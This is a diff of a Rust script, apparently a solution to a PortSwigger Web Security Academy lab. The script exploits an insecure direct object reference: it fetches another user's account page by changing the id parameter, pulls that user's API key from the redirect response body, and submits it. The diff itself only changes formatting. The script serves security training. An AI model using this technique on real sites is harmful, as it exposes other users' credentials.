@@ -4,10 +4,10 @@
 *
 * Date: 5/9/2023
 *
-* Lab: User ID controlled by request parameter with data leakage in redirect 
+* Lab: User ID controlled by request parameter with data leakage in redirect
 *
 * Steps: 1. Fetch carlos profile
-*        2. Extract the API key from response body before 
+*        2. Extract the API key from response body before
 *           redirecting to login page
 *        3. Submit solution
 *
@@ -35,39 +35,43 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a6700c0047cb536ce7e91bf001a00c8.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
-    // fetch carlos profile
     print!("{} ", "1. Fetching carlos profile page..".white());
     io::stdout().flush();
+
+    // fetch carlos profile
     let carlos_profile = client
         .get(format!("{url}/my-account?id=carlos"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch carlos profile".red()));
-    println!("{}", "OK".green());
 
-    // extract the API key of carlos from response body before redircting 
+    println!("{}", "OK".green());
     print!(
         "{} ",
         "2. Extracting the API key from response body before redirecting..".white()
     );
     io::stdout().flush();
+
+    // extract the API key of carlos from response body before redircting
     let body = carlos_profile.text().unwrap();
     let api_key = capture_pattern("Your API Key is: (.*)</div>", &body)
         .expect(&format!("{}", "[!] Failed to extract the API key".red()));
-    println!("{}", "OK".green());
 
-    // submit solution
+    println!("{}", "OK".green());
     print!("{} ", "3. Submitting solution..".white());
     io::stdout().flush();
+
+    // submit solution
     let submit_ansewer = client
         .post(format!("{url}/submitSolution"))
         .form(&HashMap::from([("answer", api_key)]))
         .send()
         .expect(&format!("{}", "[!] Failed to submit solution".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "[#] Check your browser, it should be marked now as"
